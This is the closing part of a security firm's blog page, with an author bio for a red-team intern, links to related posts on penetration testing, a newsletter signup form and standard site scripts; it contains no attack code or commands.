<div class="media-file-card-view cc-1yn77bd" data-testid="media-file-card-view" data-test-status="complete" data-test-media-name="Capture-20230807-164947.JPG" data-test-progress="1">Alex Reid is an intern at Red Siege Information Security. Alex got started in offensive security 4 years ago on the United States Navy Red Team, and has been awarded several medals by the military for his work there as an advanced capabilities developer and red team technical lead. He has presented at several DoD Red Team conferences and is an active contributor to the offensive security community via open source tooling published on his personal <a class="cc-tgpl01" title="https://github.com/Octoberfest7" href="https://github.com/Octoberfest7" data-testid="link-with-safety" data-renderer-mark="true">GitHub</a>.</div>
<p data-renderer-start-pos="4379"><strong data-renderer-mark="true">Certifications:</strong></p>
<p data-renderer-start-pos="4396">OSCP, OSEP, and RTJC</p>
<p data-renderer-start-pos="4418">Connect on <a class="cc-tgpl01" title="https://twitter.com/Octoberfest73" href="https://twitter.com/Octoberfest73" data-testid="link-with-safety" data-renderer-mark="true">Twitter</a> and <a class="cc-tgpl01" title="https://www.linkedin.com/in/alex-reid-2b5360222/" href="https://www.linkedin.com/in/alex-reid-2b5360222/" data-testid="link-with-safety" data-renderer-mark="true">Linkedin</a></p>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
			</div>
		</div>
	</div>

			<div class="grid-container">
			<div class="archive-section-info">
				<p>Related Stories</p>
				<a href="/blog/">View More</a>
			</div>
			<div class="grid-x grid-margin-x">
				
								<div class="article-card cell small-12 medium-6 large-4">
					<div class="text-wrap">
						<h2 class="article-title">Essential Steps for Management to Maximize the Value of a Penetration Test Report</h2>
						<p class="post-details">By Red Siege | June 3, 2024</p>
						<p></p><p>by Tim Medin, CEO Penetration testing is a critical component of a well-rounded cybersecurity strategy. Penetration testing identifies vulnerabilities before malicious actors can exploit them. However, the true value of […]</p>
<p></p>
						<span class="cta">Learn More</span>
					</div>
					<a href="https://redsiege.com/blog/2024/06/essential-steps-for-management-to-maximize-the-value-of-a-penetration-test-report/">Essential Steps for Management to Maximize the Value of a Penetration Test Report</a>
				</div>
								<div class="article-card cell small-12 medium-6 large-4">
					<div class="text-wrap">
						<h2 class="article-title">Fun With JWT X5u</h2>
						<p class="post-details">By Red Siege | May 30, 2024</p>
						<p></p><p>by Senior Security Consultant Douglas Berdeaux On a recent web application penetration test engagement, I came across a JSON Web Token (JWT) that contained an x5u header parameter. I almost […]</p>
<p></p>
						<span class="cta">Learn More</span>
					</div>
					<a href="https://redsiege.com/blog/2024/05/fun-with-jwt-x5u/">Fun With JWT X5u</a>
				</div>
								<div class="article-card cell small-12 medium-6 large-4">
					<div class="text-wrap">
						<h2 class="article-title">Extend Your Browser</h2>
						<p class="post-details">By Red Siege | May 9, 2024</p>
						<p></p><p>by Ian Briley, Security Consultant In my last blog, I discussed using only a browser for web application testing, emphasizing how useful built-in browser tools like the Inspector and Console […]</p>
<p></p>
						<span class="cta">Learn More</span>
					</div>
					<a href="https://redsiege.com/blog/2024/05/extend-your-browser/">Extend Your Browser</a>
				</div>
							</div>
		</div>
	</section>

<section class="related-posts">

</section>



<section class="newsletter ">
	
	<div class="grid-container grid-x grid-padding-x align-center-middle">
		<div class="cell small-12 medium-6 large-5">
			<h2>Find Out What’s Next</h2><p>Stay in the loop with our upcoming events.</p>		</div>

		<div class="cell small-12 medium-6 large-7">
			<div class="wpforms-container wpforms-container-full" id="wpforms-1472"><form id="wpforms-form-1472" class="wpforms-validate wpforms-form" data-formid="1472" method="post" enctype="multipart/form-data" action="/blog/2024/01/graphstrike-developer/" data-token="87af0e167cef82d7189463f002a72ea9" data-token-time="1718423231"><noscript class="wpforms-error-noscript">Please enable JavaScript in your browser to complete this form.</noscript><div class="wpforms-field-container"><div id="wpforms-1472-field_1-container" class="wpforms-field wpforms-field-email" data-field-id="1"><label class="wpforms-field-label" for="wpforms-1472-field_1">Email <span class="wpforms-required-label">*</span></label><input type="email" id="wpforms-1472-field_1" class="wpforms-field-large wpforms-field-required" name="wpforms[fields][1]" placeholder="Type Your Email Address" spellcheck="false" required=""></div></div><!-- .wpforms-field-container --><div class="wpforms-field wpforms-field-hp"><label for="wpforms-1472-field-hp" class="wpforms-field-label">Comment</label><input type="text" name="wpforms[hp]" id="wpforms-1472-field-hp" class="wpforms-field-medium"></div><div class="wpforms-submit-container"><input type="hidden" name="wpforms[id]" value="1472"><input type="hidden" name="page_title" value="GraphStrike: Anatomy of Offensive Tool Development"><input type="hidden" name="page_url" value="https://redsiege.com/blog/2024/01/graphstrike-developer/"><input type="hidden" name="page_id" value="4553"><input type="hidden" name="wpforms[post_id]" value="4553"><button type="submit" name="wpforms[submit]" id="wpforms-submit-1472" class="wpforms-submit" data-alt-text="Sending..." data-submit-text="JOIN OUR EMAIL LIST" aria-live="assertive" value="wpforms-submit">JOIN OUR EMAIL LIST</button></div></form></div>  <!-- .wpforms-container -->		</div>
	</div>
	
</section>

</main>
<footer class="footer">
	<section class="footer-content">
		<div class="grid-container grid-x grid-padding-x grid-padding-y">
			<div class="cell small-12 large-6 text-center large-text-left">
				<p class="h5 uppercase mb-0">Stay Connected</p><ul class="social"><li><a href="https://discord.com/invite/VpHXYUp"><img src="https://redsiege.com/wp-content/uploads/2022/01/icon-discord.svg" class="attachment-full size-full" alt="" decoding="async" loading="lazy"><span class="screen-reader-text">Discord</span></a></li><li><a href="https://www.linkedin.com/company/redsiege"><img src="https://redsiege.com/wp-content/uploads/2022/01/icon-linkedin.svg" class="attachment-full size-full" alt="" decoding="async" loading="lazy"><span class="screen-reader-text">LinkedIn</span></a></li><li><a href="http://www.redsiege.com/ytsubscribe"><img src="https://redsiege.com/wp-content/uploads/2022/01/icon-youtube.svg" class="attachment-full size-full" alt="" decoding="async" loading="lazy"><span class="screen-reader-text">YouTube</span></a></li><li><a href="https://twitter.com/RedSiege"><img src="https://redsiege.com/wp-content/uploads/2022/01/icon-twitter.svg" class="attachment-full size-full" alt="" decoding="async" loading="lazy"><span class="screen-reader-text">Twitter</span></a></li><li><a href="http://redsiege.com/blog/feed"><img width="35" height="36" src="https://redsiege.com/wp-content/uploads/2024/03/2Asset-5rss.png" class="attachment-full size-full" alt="" decoding="async" loading="lazy"><span class="screen-reader-text">Blog RSS</span></a></li></ul>			</div>

			<div class="cell small-12 large-6 text-center large-text-right">

				
				<a href="tel:12342491337" class="contact-link"><img src="https://redsiege.com/wp-content/themes/red-siege-theme/img/icon-phone.svg"> +1 234-249-1337</a>
			</div>
		</div>
	</section>

	<section class="footer-copyright">
		<div class="grid-container grid-x grid-padding-x grid-padding-y medium-flex-dir-row-reverse text-center">
			<div class="cell small-6 small-offset-3 medium-3 medium-offset-0">
				<img width="300" height="73" src="https://redsiege.com/wp-content/uploads/2022/01/redsiege-logo-300x73.png" class="attachment-medium size-medium" alt="" decoding="async" loading="lazy" srcset="https://redsiege.com/wp-content/uploads/2022/01/redsiege-logo-300x73.png 300w, https://redsiege.com/wp-content/uploads/2022/01/redsiege-logo-1024x249.png 1024w, https://redsiege.com/wp-content/uploads/2022/01/redsiege-logo-768x187.png 768w, https://redsiege.com/wp-content/uploads/2022/01/redsiege-logo-1536x374.png 1536w, https://redsiege.com/wp-content/uploads/2022/01/redsiege-logo-2048x499.png 2048w" sizes="(max-width: 300px) 100vw, 300px">			</div>
			<div class="cell small-12 medium-9">
				© Red Siege, LLC. All Rights Reserved. "Red Siege", the Red Siege Logo, and "I am Offensive" are federally registered trademarks and "We are Offensive" is a trademark owned by Red Siege, LLC. Any unauthorized use is expressly prohibited.			</div>
		</div>
	</section>
</footer>

		<script>
		( function ( body ) {
			'use strict';
			body.className = body.className.replace( /\btribe-no-js\b/, 'tribe-js' );
		} )( document.body );
		</script>
		<script> /* <![CDATA[ */var tribe_l10n_datatables = {"aria":{"sort_ascending":": activate to sort column ascending","sort_descending":": activate to sort column descending"},"length_menu":"Show _MENU_ entries","empty_table":"No data available in table","info":"Showing _START_ to _END_ of _TOTAL_ entries","info_empty":"Showing 0 to 0 of 0 entries","info_filtered":"(filtered from _MAX_ total entries)","zero_records":"No matching records found","search":"Search:","all_selected_text":"All items on this page were selected. ","select_all_link":"Select all pages","clear_selection":"Clear Selection.","pagination":{"all":"All","next":"Next","previous":"Previous"},"select":{"rows":{"0":"","_":": Selected %d rows","1":": Selected 1 row"}},"datepicker":{"dayNames":["Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday"],"dayNamesShort":["Sun","Mon","Tue","Wed","Thu","Fri","Sat"],"dayNamesMin":["S","M","T","W","T","F","S"],"monthNames":["January","February","March","April","May","June","July","August","September","October","November","December"],"monthNamesShort":["January","February","March","April","May","June","July","August","September","October","November","December"],"monthNamesMin":["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"],"nextText":"Next","prevText":"Prev","currentText":"Today","closeText":"Done","today":"Today","clear":"Clear"}};/* ]]> */ </script><link rel="stylesheet" id="wpforms-classic-full-css" href="https://redsiege.com/wp-content/plugins/wpforms/assets/css/frontend/classic/wpforms-full.min.css?ver=1.8.8.3" type="text/css" media="all">
<script type="text/javascript" id="leadin-script-loader-js-js-extra">
/* <![CDATA[ */
var leadin_wordpress = {"userRole":"visitor","pageType":"post","leadinPluginVersion":"11.1.21"};
/* ]]> */
</script>
<script type="text/javascript" src="https://js.hs-scripts.com/22155268.js?integration=WordPress&amp;ver=11.1.21" id="leadin-script-loader-js-js"></script>
<script type="text/javascript" src="https://redsiege.com/wp-content/plugins/ra-widgets-animate/public/js/aos.min.js" id="rawa-aos-js-js"></script>
<script type="text/javascript" id="rawa-app-js-js-extra">
/* <![CDATA[ */
var rawa_aos = {"offset":"120","duration":"400","easing":"ease","delay":"0","disable":"false","custom":"768","once":"false"};
/* ]]> */
</script>
<script type="text/javascript" src="https://redsiege.com/wp-content/plugins/ra-widgets-animate/public/js/rawa.min.js" id="rawa-app-js-js"></script>
<script type="text/javascript" src="https://redsiege.com/wp-content/plugins/topbar-call-to-action-pro-premium/assets/js/jquery.cookie.min.js?ver=1.4.1" id="jquery-cookie-js"></script>
<script type="text/javascript" src="https://redsiege.com/wp-content/plugins/topbar-call-to-action-pro-premium/assets/js/custom.min.js?ver=1.0.0" id="st-topbar-cta-script-js"></script>
<script type="text/javascript" id="ez-toc-scroll-scriptjs-js-extra">
/* <![CDATA[ */
var eztoc_smooth_local = {"scroll_offset":"30","add_request_uri":""};
/* ]]> */
</script>
<script type="text/javascript" src="https://redsiege.com/wp-content/plugins/easy-table-of-contents/assets/js/smooth_scroll.min.js?ver=2.0.66.1" id="ez-toc-scroll-scriptjs-js"></script>
<script type="text/javascript" src="https://redsiege.com/wp-content/plugins/easy-table-of-contents/vendor/js-cookie/js.cookie.min.js?ver=2.2.1" id="ez-toc-js-cookie-js"></script>
<script type="text/javascript" src="https://redsiege.com/wp-content/plugins/easy-table-of-contents/vendor/sticky-kit/jquery.sticky-kit.min.js?ver=1.9.2" id="ez-toc-jquery-sticky-kit-js"></script>
<script type="text/javascript" id="ez-toc-js-js-extra">
/* <![CDATA[ */
var ezTOC = {"smooth_scroll":"1","visibility_hide_by_default":"","scroll_offset":"30","fallbackIcon":"<span class=\"\"><span class=\"eztoc-hide\" style=\"display:none;\">Toggle<\/span><span class=\"ez-toc-icon-toggle-span\"><svg style=\"fill: #999;color:#999\" xmlns=\"http:\/\/www.w3.org\/2000\/svg\" class=\"list-377408\" width=\"20px\" height=\"20px\" viewBox=\"0 0 24 24\" fill=\"none\"><path d=\"M6 6H4v2h2V6zm14 0H8v2h12V6zM4 11h2v2H4v-2zm16 0H8v2h12v-2zM4 16h2v2H4v-2zm16 0H8v2h12v-2z\" fill=\"currentColor\"><\/path><\/svg><svg style=\"fill: #999;color:#999\" class=\"arrow-unsorted-368013\" xmlns=\"http:\/\/www.w3.org\/2000\/svg\" width=\"10px\" height=\"10px\" viewBox=\"0 0 24 24\" version=\"1.2\" baseProfile=\"tiny\"><path d=\"M18.2 9.3l-6.2-6.3-6.2 6.3c-.2.2-.3.4-.3.7s.1.5.3.7c.2.2.4.3.7.3h11c.3 0 .5-.1.7-.3.2-.2.3-.5.3-.7s-.1-.5-.3-.7zM5.8 14.7l6.2 6.3 6.2-6.3c.2-.2.3-.5.3-.7s-.1-.5-.3-.7c-.2-.2-.4-.3-.7-.3h-11c-.3 0-.5.1-.7.3-.2.2-.3.5-.3.7s.1.5.3.7z\"\/><\/svg><\/span><\/span>"};
/* ]]> */
</script>
<script type="text/javascript" src="https://redsiege.com/wp-content/plugins/easy-table-of-contents/assets/js/front.min.js?ver=2.0.66.1-1716568345" id="ez-toc-js-js"></script>
<script type="text/javascript" src="https://redsiege.com/wp-content/themes/red-siege-theme/js/slick.min.js?ver=1.0.0" id="import_slick-js"></script>
<script type="text/javascript" src="https://redsiege.com/wp-content/themes/red-siege-theme/js/scripts.js?ver=1.0.0" id="base_function-js"></script>
<script type="text/javascript" src="https://redsiege.com/wp-content/plugins/enlighter/cache/enlighterjs.min.js?ver=0A0B0C" id="enlighterjs-js"></script>
<script type="text/javascript" id="enlighterjs-js-after">
/* <![CDATA[ */
!function(e,n){if("undefined"!=typeof EnlighterJS){var o={"selectors":{"block":"pre.EnlighterJSRAW","inline":"code.EnlighterJSRAW"},"options":{"indent":4,"ampersandCleanup":true,"linehover":true,"rawcodeDbclick":false,"textOverflow":"break","linenumbers":true,"theme":"enlighter","language":"generic","retainCssClasses":false,"collapse":false,"toolbarOuter":"","toolbarTop":"{BTN_RAW}{BTN_COPY}{BTN_WINDOW}{BTN_WEBSITE}","toolbarBottom":""}};(e.EnlighterJSINIT=function(){EnlighterJS.init(o.selectors.block,o.selectors.inline,o.options)})()}else{(n&&(n.error||n.log)||function(){})("Error: EnlighterJS resources not loaded yet!")}}(window,console);
/* ]]> */
</script>
<script type="text/javascript" src="https://redsiege.com/wp-content/plugins/wpforms/assets/lib/jquery.validate.min.js?ver=1.20.0" id="wpforms-validation-js"></script>
<script type="text/javascript" src="https://redsiege.com/wp-content/plugins/wpforms/assets/lib/mailcheck.min.js?ver=1.1.2" id="wpforms-mailcheck-js"></script>
<script type="text/javascript" src="https://redsiege.com/wp-content/plugins/wpforms/assets/lib/punycode.min.js?ver=1.0.0" id="wpforms-punycode-js"></script>
<script type="text/javascript" src="https://redsiege.com/wp-content/plugins/wpforms/assets/js/share/utils.min.js?ver=1.8.8.3" id="wpforms-generic-utils-js"></script>
<script type="text/javascript" src="https://redsiege.com/wp-content/plugins/wpforms/assets/js/frontend/wpforms.min.js?ver=1.8.8.3" id="wpforms-js"></script>
<script type="text/javascript">
/* <![CDATA[ */
var wpforms_settings = {"val_required":"This field is required.","val_email":"Please enter a valid email address.","val_email_suggestion":"Did you mean {suggestion}?","val_email_suggestion_title":"Click to accept this suggestion.","val_email_restricted":"This email address is not allowed.","val_number":"Please enter a valid number.","val_number_positive":"Please enter a valid positive number.","val_minimum_price":"Amount entered is less than the required minimum.","val_confirm":"Field values do not match.","val_checklimit":"You have exceeded the number of allowed selections: {#}.","val_limit_characters":"{count} of {limit} max characters.","val_limit_words":"{count} of {limit} max words.","val_recaptcha_fail_msg":"Google reCAPTCHA verification failed, please try again later.","val_turnstile_fail_msg":"Cloudflare Turnstile verification failed, please try again later.","val_inputmask_incomplete":"Please fill out the field in required format.","uuid_cookie":"1","locale":"en","wpforms_plugin_url":"https:\/\/redsiege.com\/wp-content\/plugins\/wpforms\/","gdpr":"","ajaxurl":"https:\/\/redsiege.com\/wp-admin\/admin-ajax.php","mailcheck_enabled":"1","mailcheck_domains":[],"mailcheck_toplevel_domains":["dev"],"is_ssl":"1","currency_code":"USD","currency_thousands":",","currency_decimals":"2","currency_decimal":".","currency_symbol":"$","currency_symbol_pos":"left","val_requiredpayment":"Payment is required.","val_creditcard":"Please enter a valid credit card number.","val_post_max_size":"The total size of the selected files {totalSize} MB exceeds the allowed limit {maxSize} MB.","val_time12h":"Please enter time in 12-hour AM\/PM format (eg 8:45 AM).","val_time24h":"Please enter time in 24-hour format (eg 22:45).","val_time_limit":"Please enter time between {minTime} and {maxTime}.","val_url":"Please enter a valid URL.","val_fileextension":"File type is not allowed.","val_filesize":"File exceeds max size allowed. File was not uploaded.","post_max_size":"268435456","token_cache_lifetime":"86400","val_password_strength":"A stronger password is required. Consider using upper and lower case letters, numbers, and symbols.","val_phone":"Please enter a valid phone number.","entry_preview_iframe_styles":["https:\/\/redsiege.com\/wp-includes\/js\/tinymce\/skins\/lightgray\/content.min.css?ver=6.5.4","https:\/\/redsiege.com\/wp-includes\/css\/dashicons.min.css?ver=6.5.4","https:\/\/redsiege.com\/wp-includes\/js\/tinymce\/skins\/wordpress\/wp-content.css?ver=6.5.4","https:\/\/redsiege.com\/wp-content\/plugins\/wpforms\/assets\/pro\/css\/fields\/richtext\/editor-content.min.css"]}
/* ]]> */
</script>

<iframe style="display: none; visibility: hidden;" owner="archetype" title="archetype"></iframe></body></html>